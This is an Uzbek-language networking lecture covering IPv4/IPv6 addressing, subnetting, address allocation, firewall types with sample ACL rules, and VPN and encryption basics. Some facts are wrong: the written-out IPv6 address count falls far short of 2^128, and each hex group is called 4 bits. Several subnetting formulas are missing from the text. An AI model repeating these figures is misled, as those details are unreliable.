Belgilanadigan nomlash tizimi: Dunyo bo‘yicha har bir mamlakatga noyob nom berilganidek, IPv4 va IPv6 protokollari Internetdagi har bir qurilmaga noyob nom (identifikator) beradi. Bu faqat kompyuterlar emas, balki mobil telefonlar va IoT qurilmalarini ham o‘z ichiga oladi.
Asosiy protocol: IPv4 va IPv6 TCP/IP stekning bir qismi hisoblanadi. Ushbu protokollar to‘plami 1980-yillardan boshlab Internetning standart ishlash tuzilmasini belgilaydi. TCP/IP stekga shuningdek, UDP (User Datagram Protocol) ham kiradi. Nomida to‘rtinchi versiya ko‘rsatilgan bo‘lsada, aslida IPv4 birinchi tarmoqlararo protokol hisoblanadi. IPv6 esa 1995-yilda aniqlangan, lekin internet-standart va TCP/IP stek qismi sifatida 2017-yilgacha qabul qilinmagan.
Ulanishsiz ma’lumot uzatish: IPv4 va IPv6 protokollari “ulanish” kontseptsiyasini ishlatmaydi; ular ko‘p paketli marshrutizatsiyani qo‘llaydi va ma’lumotlarni kichik bloklarga bo‘lib yuboradi. Har bir paket uchun alohida yo‘l aniqlanadi, ya’ni bir xil ma’lumot fragmenti paketlari Internet orqali turli yo‘llar orqali qabul qiluvchiga yetkazilishi mumkin. Qabul qiluvchi qurilmada paketlar to‘g‘ri tartibda yig‘iladi. Buni OSI modelining transport qatlamidagi TCP va UDP protokollari amalga oshiradi.
IPv4 va IPv6 paketlarining tuzilishi turlicha: IPv6 boshqa sarlavhalarni ishlatadi va ular uchun kamroq joy talab qiladi.  IPv6 marshrutizatsiya imkoniyatlarini kengaytirish uchun alohida sarlavha paketlarini ham qo‘llab-quvvatlaydi.
Quyida foydalanuvchi nuqtai nazaridan uchta asosiy farq keltirilgan:
Manzil maydoni: IPv4 manzil maydoni 2³² (4 294 967 296) IP-manzilga, IPv6 manzil maydoni esa 2¹²⁸ (340 282 366 920 938 000 000 000 000) noyob IP-manzilga ega. IPv4 manzillaridan taxminan 588 millioni ajratilgan, qolganlari ochiq foydalanish uchun. Internet qurilmalarining soni oshishi sababli, IPv4 manzillari 2011-yilda tugadi. IPv6 ga to‘liq o‘tish manzil maydoni yetishmovchiligini hal qiladi. Hozircha esa vaqtinchalik yechim sifatida NAT (Network Address Translation) kabi boshqa manzil tizimlari ishlatiladi.
IPv6 da ham ko‘plab manzillar ajratilgan, ammo manzil maydoni sezilarli darajada katta bo‘lganligi sababli bu muammo emas. Hozirgi baholashlar bo‘yicha bu manzil maydonini tugatish imkonsiz.
Nomlash:  IPv4 manzillari to‘rt o‘nlik sanoq tizimidagi son bilan ifodalanadi (0 dan 255 gacha), nuqtalar bilan ajratilgan: 197.0.0.1.  IPv6 manzillari sakkizta o‘n oltilik sanoq tizimidagi son bilan ifodalanadi (har biri 4 bitga teng, 0-9 yoki a-f raqamlar), ikki nuqta bilan ajratilgan: 2600:1400:d:5a3::3bd4. Agar manzilda ketma-ket bir nechta nol bo‘lsa, ularni ikki nuqta orasidagi bo‘sh blokga siqib yozish mumkin.
Kommunikatsiya turlari: Ma’lumot almashish samaradorligini oshirish uchun IPv4 va IPv6 turli manzil turlarini qo‘llab-quvvatlaydi:
IPv4: unicast (“birga bir”), broadcast (“birga barcha”), multicast (“birga ko‘p”);
IPv6: unicast, multicast va anycast (“bir manba, guruh ichidagi eng yaqin qabul qiluvchiga”).  Anycast tarmoq yo‘l protokollari yordamida eng qisqa yoki eng kam xarajatli yo‘lni tanlaydi.
2.15 va 2.16- rasmlarda IPv4 va IPv6 protokol versiyalari uchun ko‘rinishlar keltirilgan. Bu yerda, Version – protocol versiyasi (4 bit), IHL (Internet Header Length) – IPv4 sarlavhasi uzunligi (4 bit), ToS (type of service) – ko‘rsatilayotgan xizmat turi (8 bit), Total length – paketning umumiy uzunligi (16 bit), Identification – paket fragmenti uchun unikal ID (16 bit), Bayroqlar (Flags) – fragmentlarni boshqaruvchi bayroqlar (3 bit), Fagment offset - fragmentlangan IP paketining tarmoq orqali jo‘natilgan bo‘laklari qaysi tartibda turganini aniqlash uchun ishlatiladi (13 bit), TTL (Time to Live) - paketni “nechta marshrutizator (tugun) orqali oʻtishi mumkinligini” bildiradigan hisoblagich, paketning tarmoq bo‘ylab cheksiz aylanishini oldini oladi (8 bit), Protocol – inkapsulyatsiyalash protokolini ko‘rsatadi (8 bit), Header checksum – (faqat) sarlavha uchun nazorat summasi, har bir tugunda qayta hisoblanadi (16 bit), Source address – yuboruvchining IPv4 protokolidagi manzili (32 bit), Destination address – qabul qiluvchining IPv4 protokolidagi manzili (32 bit), Options -  Pv4 sarlavhasidagi ixtiyoriy (majburiy bo‘lmagan) qo‘shimcha maydonlar bo‘limi bo‘lib, maxsus boshqaruv, diagnostika yoki marshrutlash talab qilingan holatlarda ishlatiladi (40 baytgacha), Data - bu IPv4 paketining asosiy ma’lumot tashuvchi qismi. Paketning umumiy maksimal uzunligi 65 535 baytligini, IPv4 sarlavhasining uzunligi (header_length) 20–60 bayt bo‘lishi mumkinligini hisobga olgan holda maksimal ma’lumot (payload) hajmini 65 535 − header_length hisoblashdan bilish mumkin.

2.15-rasm. IPv4 protokol stekining ko‘rinishi
IPv6 uchun: Version – IP protocol versiyasini ko‘rsatadi (4 bit), Traffic class - paketning ustuvorligi va xizmat sifatini (QoS) belgilaydi (8 bit), Flow label - bir xil oqimga (video, ovoz, VPN va h.k.) tegishli paketlarni aniqlash uchun ishlatiladi (20 bit), Payload Length - asosiy sarlavhadan keyingi barcha ma’lumotlar (extension headers + data) uzunligini ko‘rsatadi (16 bit), Next Header - keyingi header turini ko‘rsatadi (8 bit), Hop Limit - paket necha routerdan o‘tishi mumkinligini belgilaydi, IPv4 dagi TTL ga to‘liq mos keladi (8 bit), Source Address - paket yuboruvchisining IPv6 manzili (128 bit), Destination Address - paket qabul qiluvchisining IPv6 manzili (128 bit), Extension Headers - IPv6 asosiy sarlavhalar faqat 40 bayt, lekin qo‘shimcha funksiyalar Extension Headerlar orqali amalga oshiriladi. Ular majburiy emas va Next Header orqali ulanadi. IPv6 protokolida alohida “data” sarlavhasi yo‘q, “Payload = Extension headerlar + transport + data” shaklida ifodalanadi, maksimal uzunligi 65 535 bayt bo‘ladi.

2.16-rasm. IPv6 protokol stekining ko‘rinishi
Qism tarmoq maskalari (Subnet Mask) va tarmoq segmentatsiyasi (segmentation)
Subnet mask - bu IP tarmog‘ida tarmoq qismi va host qismini ajratib beradigan 32-bitli qiymat (IPv4 uchun). U tarmoqning chegarasini belgilaydi va IP manzillarni kichik tarmoqlarga bo‘lishga yordam beradi. Uning asosiy vazifasi quyidagilardan iborat (2.17-rasm):
	•	IP manzilning qaysi qismi tarmoq, qaysi qismi esa host ekanini ko‘rsatadi;
	•	tarmoqni kichik bo‘limlarga (subnetlarga) ajratishga imkon beradi;
	•	marshrutlashni soddalashtiradi va optimallashtiradi;
	•	xavfsizlikni oshiradi (segmentlar bir-biridan ajratiladi).
IP manzilidagi “1” bitlar - tarmoq qismini, “0” bitlar - host qismini anglatadi va odatda CIDR ko‘rinishida yoziladi (masalan, /24, /16 - prefix deb ataladi).  Masalan: 255.255.255.0 → /24, 255.255.0.0 → /16.

2.17-rasm.  Subnet Maskning ahamiyati
Tarmoqqa tegishli manzil subnetdagi birinchi manzil (host qismi to‘liq 0) bo‘lsa, oxirgi manzil esa broadcast manzil deb atalib (host qismi to‘liq 1), shu manzilga yuborilgan paket subnetdagi barcha hostlarga yetkaziladi. Tarmoqdagi barcha hostlar sonini  tenglik bilan aniqlash mumkin.
Masalan, sizda 192.168.10.0/24 tarmog‘i bor va sizga 4 ta teng subnet kerak. Qanday qilib bo‘lish mumkin?
Necha subnet kerak? - 4 ta → kerakli qo‘shimcha bitlar  ni topamiz: .
Asl prefix /24 → yangi prefix =  → har biri /26.
Har subnetdagi hostlar soni: .
Subnetlar:
	•	192.168.10.0/26 (hostlar: .1 – .62, broadcast .63);
	•	192.168.10.64/26 (hostlar: .65 – .126, broadcast .127);
	•	192.168.10.128/26 (hostlar: .129 – .190, broadcast .191);
	•	192.168.10.192/26 (hostlar: .193 – .254, broadcast .255).
Tarmoq segmentatsiyasi
Tarmoq segmentatsiyasi - bu kompyuter tarmog‘ini kichik va mustaqil bo‘limlarga (segmentlarga) ajratish jarayonidir. Har segment alohida boshqariladigan va cheklangan o‘zaro aloqaga ega bo‘lgan tarmoq bo‘limidir. Tarmoqni segmentatsiyalashdan asosiy maqsad xavfsizlikni oshirish, trafikni optimallashtirish, resurslarni ajratish va xatolarni tez aniqlash bo‘lib, bunda fizik, mantiqiy (Virtual LAN va IP subnetlash), xavfsizlik segmentatsiyasi usullaridan keng foydalaniladi.
IP manzillar guruhlari
IP manzil guruhlari - bu IPv4 manzillarni Class A, B, C, D, E kabi sinflarga bo‘lish tizimi bo‘lib, uni o‘rniga hozirgi zamonaviy tarmoqlarda CIDR ishlatilib kelinmoqda. Lekin, IP guruhlari (classes) hali ham muhim bo‘lib, xususan subnetlashni tushunish, tarmoqni loyihalash, eski tizimlar bilan ishlashda va imtihonlarga (CCNA va h.k.) tayyorlanish uchun zarur. IP manzil 32 bitdan iborat va 0.0.0.0 – 255.255.255.255 oralig‘ida bo‘ladi. Umumiy holda barcha IP manzillari guruhlari quyidagi rasmda keltirilgan (2.18-rasm).

2.18-rasm. IP manzillar guruhlari
IP manzillarni tarqatish
IP manzillar butun dunyo bo‘yicha 5 bosqichli tizim orqali tarqatiladi:
1. IANA (Internet Assigned Numbers Authority) - eng yuqori daraja;
2. RIR (Regional Internet Registry) - mintaqaviy internet registrlari;
3. LIR (Local Internet Registry) / ISP (Internet Service Provider) - lokal operatorlar;
4. Korporatsiyalar, tashkilotlar, universitetlar;
5. Oddiy foydalanuvchilar / qurilmalar.
1. IANA - Internet Assigned Numbers Authority
IP manzillarni global darajada boshqarish IANA tomonidan amalga oshiriladi. Ushbu tashkilot IPv4 va IPv6 manzillarining butun dunyo bo‘yicha asosiy operatori hisoblanadi. IANA katta hajmdagi IP bloklarni (odatda IPv4 uchun /8, IPv6 uchun esa /12 yoki /23 prefiksli bloklar) tegishli mintaqaviy registrlarga taqsimlaydi. Shuningdek, IANA DNS Root Zone boshqaruvi, protokol raqamlarini belgilash kabi boshqa tizim darajasidagi funksiyalarni ham bajaradi.
2. RIR - Mintaqaviy Internet Registrlari
Dunyo besh mintaqaga bo‘lingan bo‘lib, har biri alohida RIR tomonidan boshqariladi:
ARIN (Shimoliy Amerika), RIPE NCC (Yevropa, Yaqin Sharq, Markaziy Osiyo), APNIC (Osiyo–Tinch okeani mintaqasi), LACNIC (Lotin Amerikasi) va AFRINIC (Afrika). O‘zbekiston RIPE NCC hududiga kiradi.
RIRlarning vazifalari quyidagilardan iborat:
– IANA tomonidan ajratilgan IP bloklarni o‘z hududidagi provayderlar va yirik tashkilotlarga taqsimlash;
– Internet raqam resurslarining ro‘yxatini yuritish;
– Regional siyosatlar asosida resurslardan oqilona foydalanishni ta’minlash.
RIRlar odatda provayderlarga IPv4 bo‘yicha /16–/20 oralig‘idagi bloklarni, IPv6 bo‘yicha esa /32 yoki /29 prefiksli resurslarni ajratadi.
3. LIR/ISP - Lokal Internet Registrlari va Provayderlar
Lokal Internet Registrlari (LIR) yoki Internet xizmat ko‘rsatuvchi provayderlar (ISP) RIRdan olingan IP manzil bloklarini o‘z mijozlariga tarqatadi. Provayderlar ushbu bloklarni kichik prefiksli subnetlarga ajratib, korxonalar, davlat tashkilotlari, universitetlar yoki yakka tartibdagi abonentlarga taqdim etadi.
ISP tomonidan tarqatiladigan odatiy IP diapazonlari:
– IPv4: /24, /25, /26 kabi kichik bloklar;
– IPv6: /64, /56 yoki /48 prefikslar.
ISPlar IP manzillarni statik yoki dinamik tarzda ajratishi, DHCP, PPPoE, CG-NAT kabi texnologiyalar orqali boshqarishi mumkin.
4. Tashkilotlar va korporativ tarmoqlar
Tashkilotlar o‘zlariga tegishli yoki provayderdan ajratilgan IP bloklarni ichki infratuzilmasiga mos ravishda taqsimlaydi. Bunda server segmentlari, foydalanuvchilar LANi, filiallar, Wi-Fi tarmoqlari yoki IoT qurilmalar alohida subnetlarga ajratiladi.
Ichki tarmoqlarda ko‘pincha quyidagi (RFC 1918 bo‘yicha) shaxsiy IP diapazonlaridan foydalaniladi:
– 10.0.0.0/8;
– 172.16.0.0/12;
– 192.168.0.0/16.
Bu manzillar internetga to‘g‘ridan-to‘g‘ri chiqmaydi va NAT vositasida global tarmoqqa ulanadi.
5. Yakuniy foydalanuvchilar va qurilmalar
IP manzil taqsimotining oxirgi bosqichi - bu yakuniy abonentlar yoki qurilmalardir. Ular provayderdan yoki lokal tarmoqdan quyidagi shakllarda IP manzil oladi:
– Public IP: global tarmoqda ko‘rinadigan statik yoki dinamik manzil;
– Private IP: lokal router tomonidan taqsimlangan ichki manzil;
– IPv6 manzili: odatda SLAAC yoki DHCPv6 orqali /64 prefiksdan avtomatik ravishda hosil qilinadi.
	IPv4 tarmoq protokoli haqida ma’lumot bering?
	•	IPv4 protokoli sarlavhalari va ularning o‘lchami haqida ayting?
	•	IPv6 tarmoq protokoli haqida ma’lumot bering?
	•	IPv6 protokoli sarlavhalari va ularning o‘lchami haqida ayting?
	•	Qism tarmoq maskalari nima va ular nima maqsadda foydalaniladi?
	•	Qism tarmoq maskalarini misol yordamida tushuntiring?
	•	Tarmoqni segmentlash deganda nimani tushunasiz?
	•	IP manzillarning guruhlash, nima uchun zarur bo‘lgani, hozirgi kundagi ahamiyati haqida ayting?

Nazorat savollari

	•	IPv4 tarmoq protokoli haqida ma’lumot bering?
	•	IPv4 protokoli sarlavhalari va ularning o‘lchami haqida ayting?
	•	IPv6 tarmoq protokoli haqida ma’lumot bering?
	•	IPv6 protokoli sarlavhalari va ularning o‘lchami haqida ayting?
	•	Qism tarmoq maskalari nima va ular nima maqsadda foydalaniladi?
	•	Qism tarmoq maskalarini misol yordamida tushuntiring?
	•	Tarmoqni segmentlash deganda nimani tushunasiz?
	•	IP manzillarning guruhlash, nima uchun zarur bo‘lgani, hozirgi kundagi ahamiyati haqida ayting?

Nazorat savollari
2.4. Tarmoqlararo ekran va filtrlash  (Ma’ruza mashg‘uloti)
Tarmoqlararo ekran vositasi, uning turlari, asosiy vazifalari. 
	•	Tarmoqlararo ekan vositasida tarmoqni himoyalash, tarmoqni filtrlash qoidalarini o‘rnatish.
Reja:
	•	Tarmoqlararo ekran vositasi, uning turlari, asosiy vazifalari. 
	•	Tarmoqlararo ekan vositasida tarmoqni himoyalash, tarmoqni filtrlash qoidalarini o‘rnatish.
Reja:

Tarmoqlararo ekran, xavfsizlik devori, firewall, proksi, qoidalar to‘plami, ishonchli va ishonchsiz tarmoq, filtrlash, Foydalanishlarni boshqarish ro‘yxati (Access control list, ACL), rusxat berish (Allow), taqiqlash (Deny).
Kalit so‘zlar:
Tarmoqlararo ekran, xavfsizlik devori, firewall, proksi, qoidalar to‘plami, ishonchli va ishonchsiz tarmoq, filtrlash, Foydalanishlarni boshqarish ro‘yxati (Access control list, ACL), rusxat berish (Allow), taqiqlash (Deny).
Kalit so‘zlar:
Tarmoqlararo ekran vositasi, uning turlari, asosiy vazifalari
Hozirda tarmoq xavfsizligini ta’minlovchi vositalarga tarmoqdan foydalanishni cheklashning bazaviy vositalari (tarmoqlararo ekran) va ma’lumotlarni himoyalangan holda uzatish vositalari  (kriptoshlyuzlar va VPN yechimlar), hamda himoyalanganlikni ta’minlovchi qo‘shimcha tarmoq vositalari, trafikni monitoringlash vositalari, yolg‘on tarmoq nishonlari va hk. taalluqli. 
Tarmoqlararo ekran. Tarmoqlararo ekran (firewall, brandmaver) – trafikni filtrlash mexanizmiga asoslangan tarmoqdan foydalanishni cheklashning bazaviy vositasi. Filtratsiya mexanizmi o‘tuvchi trafikni ma’lum qoidalar (filtrlar) bilan taqqoslashni va tarmoq paketlarini o‘tkazish yoki o‘tkazmaslik xususida qaror qabul qilishni ko‘zda tutadi. 
Tarmoqlararo ekran - bu tarmoqdan kirib-chiqayotgan barcha trafikni nazorat qiluvchi, ruxsat berilgan va taqiqlangan trafikni filtrlash orqali tizimni tashqi hujumlardan himoya qiluvchi apparat yoki dasturiy vositadir.
Uning asosiy vazifasi - ishonchli (trusted) va ishonchsiz (untrusted) tarmoqlar orasida “xavfsizlik devorini” yaratish (2.19-rasm).

2.19-rasm.  Tarmoqlararo ekranning tarmoqda joylashuvi
Tarmoqlararo ekranlarni, odatda, ishlatiladigan filtrlash texnologiyasiga va OSI modelining bazaviy sathiga nisbatan tasniflashadi (2.1-jadval).
2.1-jadval
Tarmoqlararo ekran turlari
OSI modeli sathlari
Filtratsiya texnologiyalari
Tarmoqlararo ekran turlari
Tatbiqiy sath
Proksi
Tatbiqiy vositachi
Seans sathi
Proksi
Seans vositachisi

Paketlar inspektori
Holat inspektori

Paketlar filtrasiyasi
Dinamik filtr
Tarmoq sathi
Paketlar filtrasiyasi
Ekranlovchi marshrutizator, paket filtri
Kanal sathi
Trafikni segmentlash
Boshqariluvchi (ekranlovchi) kommutator
Kanal sathida ishlatiluvchi boshqariluvchi kommutatorlar, masalan, MAC-manzillar, portlar va kadrlar sarlavhalaridan olingan boshqa parametrlar asosida, trafikni filtrlash vazifasining bajarilishiga imkon beradi. Boshqariluvchi kommutatorlarning afzalligi sifatida tarmoq qurilmalari guruhini ma’murlashning qulayligini, lokal tarmoq unumdorligining oshishini ko‘rsatish mumkin. Funksionallikning cheklanganligi, fizik rekonfiguratsiyalashning noqulayligi va MAC-manzilni almashtirish hujumiga zaifligi boshqariluvchi kommutatorlarning kamchiligi hisoblanadi.
Tarmoq sathining paket filtrlari va marshrutizatorlar IP-manzil, portlar, protokol turi va hk bo‘yicha filtrlash vazifasining bajarilishiga imkon beradi. Tarmoq va transport sathlari funksionalliklarining cheklanganligi va IP-manzilni almashtirish hujumiga zaifligi paket filtrlarining kamchiligi hisoblanadi.  
Seans sathining paket filtrlari, seansga mos filtrlash parametrlarining katta sonini hisobga olgan holda, filtrlashni bajarishga imkon beradi. 
Vositachilar  - oraliq tarmoq vositalari o‘ziga tegishli ulanishni amalga oshirib, trafikni qo‘shimcha qurilmada ishlaydi. Bu o‘z navbatida quyidagi vazifalarni bajarishga imkon beradi:
	•	autentifikatsiyani;
	•	mijozlar va serverlarning asinxron muloqotini;
	•	manzillarning translyatsiyasini va yashirishni;
	•	tarmoq yukini qayta taqsimlash maqsadida manzilni o‘zgartirishni;
	•	almashish unumdorligini oshirish maqsadida xeshlashni;
	•	trafikni qaydlashni.
Ayni paytda, vositachilardan foydalanilganda, trafik qo‘shimcha qurilmada takroriy ishlangani sababli, tarmoq perimetri bo‘yicha istalgan unumdorlikni ta’minlash masalasini yechish talab etiladi.
Vositachi tomonidan amalga oshiriluvchi marshrutlash texnologiyasiga alohida e’tibor berish lozim. Unga binoan tarmoq manzillarining translyatsiyasi (Network Address Translation, NAT) amalga oshiriladi, ya’ni hostning ichki manzili vositachining shaxsiy manziliga almashtiriladi. Boshqacha aytganda, NAT ichki tarmoq manzillarini tashqi tomondan yashirish siyosatini amalga oshiradi va ichki tarmoq uchun vositachiga bitta IP-manzilni belgilash imkoniyatini yaratadi. Manzillarni translyatsiyalash statik va dinamik tarzda belgilanishi mumkin. 
Seans sathidagi vositachilarga, yuqori unumdorlikka, manzillarni yashiruvchi samaradorli apparatga va TCP/UDP – trafikni ajratish imkoniyatiga ega SOCKet Secure (SOCKS5) vositachisi taalluqli.  Tatbiqiy vositachi sifatida HTTP/HTTPS vositachilari va FTP vositachi keng tarqalgan. Ushbu vositachilar tatbiqiy protokol kontenti bo‘yicha filtrlashga imkon tug‘diradi. 
Holat inspektorlari (seans sathining imkoniyati kengaytirilgan filtrlari), seans sathidagi protokollar sarlavhalaridan olinuvchi ma’lumotlar asosida, intelektual filtrlashni bajaradi. Bu yuqori sathlarda filtrlash effektini olishga imkon beradi. Bunday tarmoqlararo ekranlar vositachini o‘rnatishni talab qilmaydi. Shu sababli, tarmoq unumdorligi pasaymaydi, ammo xavfsizlikning kerakli darajasi ta’minlanadi. Holat inspektorining afzalligiga masshtablashning qulayligini ham qo‘shish mumkin. 
Amaliyotda axborot resurslarining tarmoqlararo himoyasini ta’minlashda UTM (Unifield Threat Management)  qurilma tushunchasini va keyingi avlod tarmoqlararo ekranlarini (Next Generation, NG firewall) uchratish mumkin. 
UTM – qurilma perimetrli himoyalash masalasining kompleks yechimi hisoblanadi. Uning tarkibida tarmoqlararo ekranlash modullaridan tashqari, suqilib kirishlarni aniqlash tizimlari, oqimli antivirus, spamga qarshi yechim, kriptoshlyuz va hk. mavjud bo‘lishi mumkin.
NG firewall UTMga o‘xshash va portlar bo‘yicha filtrlash texnikasini, suqilib kirishlardan ogohlantirish tizimlarini va ilovalar sathida trafikni filtrlashni birlashtirish maqsadida yaratilgan.
Tarmoqlararo ekan vositasida tarmoqni himoyalash, tarmoqni filtrlash qoidalarini o‘rnatish
Filtrlash qoidalari tarmoqlararo ekanning eng muhim qismidir. Odatda ular “ACL - Access Control List” sifatida belgilanadi. Quyida ularga oid misollar keltiriladi.

Ruxsat berish (ALLOW) qoidalari
80 (HTTP) va 443 (HTTPS) portlariga tashqi trafikni kirishiga ruxsat berish:
ALLOW IN ANY → WebServer:80
ALLOW IN ANY → WebServer:443
Taqiqlash (DENY) qoidalari
Ichki tarmoqqa tashqi SSH ulanishni taqiqlash:
DENY IN ANY → InternalNet:22
ICMP (ping) cheklovlari
Ko‘p hollarda xavfsizlik sababli tashqaridan kiruvchi ping buyruqlariga ruxsat berilmaydi:
DENY IN ANY → ANY (ICMP Echo Request)
NAT qoidasini o‘rnatish
Ichki tarmoq foydalanuvchilarini internetga chiqish uchun:
NAT OUT InternalNet → Internet
Joriy holatda taqiq qoidasini (Default-deny) o‘rnatish
Dastlab hamma trafikni taqiqlash, keyin faqat kerakli xizmatlarga ruxsat berish:
DENY ALL
ALLOW kerakli_portlar
Xavsiz bo‘lmagan protokollarni bloklash
Zaif va himoyani ta’minlamaydigan protokollarni cheklash:
TFTP, Telnet, SNMP v1/v2, SMB, NetBIOS kabi protokollar → Taqiqlansin
Trafikning turiga qarab filtrlash
Ishchi tarmoqning unumdorligi va xavfsizligini oshirish uchun turli ilovalarni cheklash uchun:
Ijtimoiy tarmoqlar, torrentlar, o‘yinlar → Taqiqlash
Biznes ilovalari (ERP, CRM) → Ruxsat
	Tarmoqlararo ekran va uning vazifasi nimadan iborat?
	•	Tarmoqlararo ekran turlari haqida ayting?
	•	Vositachilar ko‘rinishidagi tarmoqlararo ekran, ularning vazifalari haqida ayting?
	•	Seans sathidagi vositachilar haqida ayting?
	•	Keyingi avlod tarmoqlararo ekranlari haqida ma’lumot bering?
	•	Filtrlash qoidalarini tarmoqlararo ekanda o‘rnatish tartibi, ularga misollar ayting?

Nazorat savollari

	•	Tarmoqlararo ekran va uning vazifasi nimadan iborat?
	•	Tarmoqlararo ekran turlari haqida ayting?
	•	Vositachilar ko‘rinishidagi tarmoqlararo ekran, ularning vazifalari haqida ayting?
	•	Seans sathidagi vositachilar haqida ayting?
	•	Keyingi avlod tarmoqlararo ekranlari haqida ma’lumot bering?
	•	Filtrlash qoidalarini tarmoqlararo ekanda o‘rnatish tartibi, ularga misollar ayting?

Nazorat savollari
2.5. Tarmoqlarda VPN qurish va shifrlash  (Ma’ruza mashg‘uloti)
IP protokolining xavfsizlik muammosi. 
	•	Shifrlash tushunchasi. 
	•	Tunellash tushunchasi. 
	•	VPN vositasi va uning asosiy maqsadi. 
	•	VPN vositalarining tasnifi.
Reja:
	•	IP protokolining xavfsizlik muammosi. 
	•	Shifrlash tushunchasi. 
	•	Tunellash tushunchasi. 
	•	VPN vositasi va uning asosiy maqsadi. 
	•	VPN vositalarining tasnifi.
Reja:

IP protokoli, zaifliklar, shifrlash, autentifikatsiyalash, yaxlitlikni tekshirish, tunellash, DoS hujumi, Virtual himoyalangan tarmoq, IPSec, SSH, SSL/TLS, L2TP, PPTP.
Kalit so‘zlar:
IP protokoli, zaifliklar, shifrlash, autentifikatsiyalash, yaxlitlikni tekshirish, tunellash, DoS hujumi, Virtual himoyalangan tarmoq, IPSec, SSH, SSL/TLS, L2TP, PPTP.
Kalit so‘zlar:
IP protokolining xavfsizlik muammosi
Internet protokoli (IP) tarmoqlararo ma’lumot uzatish protokoli bo‘lib, u paketlarni manzillash, marshrutlash va yetkazib berish vazifalarini bajaradi. Biroq, IP protokolini loyihalashdan asosiy maqsad xavfsizlikni ta’minlash emas, balki funksionallik va uzatish samaradorligini ta’minlash hisoblanadi. Natijada ushbu protokolda zamonaviy kiberxavfsizlik talablariga javob bermaydigan bir qator zaifliklar kuzatilmoqda.
IP protokolining eng asosiy muammolaridan biri - autentifikatsiya va ma’lumot yaxlitligini tekshirishning mavjud emasligi. Protokol paketning haqiqiy yuboruvchisi kimligini aniqlay olmaydi. Shu sababli IP manzilni soxtalashtirish (IP spoofing) juda oson. Bu holat DDoS, O‘rtada turgan odam (Man-in-the-Middle) va sessiyani qo‘lga kiritish kabi hujumlarni amalga oshirishda qo‘l keladi. Boshqacha aytganda, paketlar tarkibidagi ma’lumot o‘zgartirilganda IP darajasida buni aniqlashning hech qanday mexanizmi yo‘q.
Bundan tashqari, IP protokol konfidensiallikni ta’minlamaydi. IP paketlari ochiq holda uzatiladi va shuning uchun ularni istalgan oraliq tugun (router, sniffer qurilmalar) orqali oson tahlil qilish va o‘qish mumkin. Bu ma’lumotlarni oshkor bo‘lishiga, parollar yoki maxfiy trafikni qo‘lga kiritilishiga sababchi bo‘lishi mumkin. IP protokolining o‘zi shifrlash funksiyasini taqdim etmaydi; shuning uchun VPN, IPSec kabi qo‘shimcha texnologiyalar talab etiladi.
IP protokoli marshrutlash hujumlariga ham bardoshsiz. Masalan, marshrutlash jadvallariga noto‘g‘ri ma’lumot yuborish orqali trafikni o‘zgartirish, yo‘naltirish yoki butunlay to‘sib qo‘yish mumkin. Tarmoqlararo hujumlarda IP fragmentatsiyasidan foydalanib tarmoqlararo ekran vositalarini chetlab o‘tish mumkin.
Shuningdek, IP protokoli xizmat ko‘rsatishdan voz kechish (DoS) hujumlariga ham himoyasiz. Juda ko‘p miqdordagi soxta IP paketlari tarmoqni band qilib qo‘yishi, resurslarni tugatishi yoki xizmat ko‘rsatishni to‘xtatib qo‘yishi mumkin.
Xulosa qilib aytganda, IP protokoli xavfsizlikni ta’minlash uchun yetarli imkoniyatlarga ega emas. Shu sababli zamonaviy tarmoqlar qo‘shimcha himoya mexanizmlaridan: tarmoqlararo ekran, IPS/IDS, VPN, shifrlash va autentifikatsiya ta’minlash usullaridan foydalanishi zarur bo‘ladi.
Shifrlash tushunchasi 
Shifrlash (encryption) — bu ma’lumotni maxfiy usulda ifodalash, ya’ni uni o‘qish mumkin bo‘lgan oddiy ko‘rinishdan (plaintext) tushunib bo‘lmaydigan shaklga (ciphertext) o‘tkazish jarayonidir. Ushbu jarayon maxsus matematik algoritmlar va kalitlar orqali amalga oshiriladi. Shifrlashning asosiy maqsadi - tarmoq yoki saqlash muhitidan qat’i nazar, ma’lumotning maxfiyligini va uning ruxsatsiz shaxslardan himoyalanganligini ta’minlashdir.
Zamonaviy axborot almashinuvida ma’lumotlar ko‘pincha ochiq tarmoqlar - internet, Wi-Fi yoki mobil aloqa orqali uzatiladi. Bunday sharoitda ma’lumotni ushlab qolish, ko‘rish yoki o‘zgartirish juda oson. Shifrlash aynan mana shu xavflarning oldini olish uchun qo‘llanadi: agar ma’lumot qo‘lga tushsa ham, uni shifrlash kalitisiz tushunish yoki tiklash mumkin bo‘lmaydi.
Shifrlash ikki asosiy turga bo‘linadi: simmetrik va assimetrik shifrlash. Simmetrik shifrlashda bir xil kalit ma’lumotni ham shifrlaydi, ham deshifrlaydi. U juda tez ishlaydi va katta hajmdagi axborotni himoyalashda qo‘llaniladi. Assimetrik shifrlashda esa ikkita kalit — ochiq (public) va shaxsiy (private) kalitlar jufti ishlatiladi, bu esa uzatish jarayonida autentifikatsiya va xavfsizlikni yanada kuchaytiradi.
Shifrlash nafaqat maxfiylikni, balki ma’lumotning buzilmaganini (integrity) va uning haqiqiy manbadan kelganini (authentication) tekshirishda ham muhim rol o‘ynaydi. Bu xususiyatlar tarmoq xavfsizligida, xususan, foydalanuvchilar o‘rtasida ishonchli muloqot kanallarini yaratishda zarurdir.
Aynan shifrlashga asoslangan texnologiyalardan biri - VPN (Virtual Private Network) bo‘lib, u ochiq internet orqali xavfsiz, shifrlangan aloqani yaratadi. VPNning asosida turuvchi tamoyillarni tushunish uchun, avvalo, shifrlashning mazmuni va ahamiyatini bilish muhimdir.
Tunellash tushunchasi 
Tunellash - bu bir tarmoq protokolidagi ma’lumotlarni boshqa bir protokol ichiga joylab, xavfsiz yoki alohida mantiqiy kanal (tunel) orqali uzatish texnologiyasidir. Oddiy qilib aytganda, tunellash ma’lumot paketlarini “qadoqlab”, tashqi tarmoqdan yashirish va ularni maqsadli nuqtaga buzilmagan holda yetkazib berish imkonini yaratadi. Bu jarayon davomida uzatilayotgan asl paket tashqi ko‘rinishda boshqa protokolga o‘xshaydi, ammo qabul qiluvchi tomon uni qayta ochib, o‘zining haqiqiy mazmuniga qaytaradi.
Tunellashning asosiy g‘oyasi — ochiq yoki ishonchsiz tarmoqlar ustidan maxsus himoyalangan kanal hosil qilish. Shu sababli ham u ko‘pincha xavfsizlikni oshirish, foydalanish huquqlarini cheklash yoki uzoq masofadagi foydalanuvchilarni ichki resurslarga ulash kabi vazifalarda qo‘llanadi. Tunel orqali o‘tgan ma’lumot odatda shifrlanadi yoki autentifikatsiya bilan himoyalanadi, bu esa ma’lumotni yo‘lda ushlab qolish, ko‘rish yoki soxtalashtirish xavfini sezilarli darajada kamaytiradi.
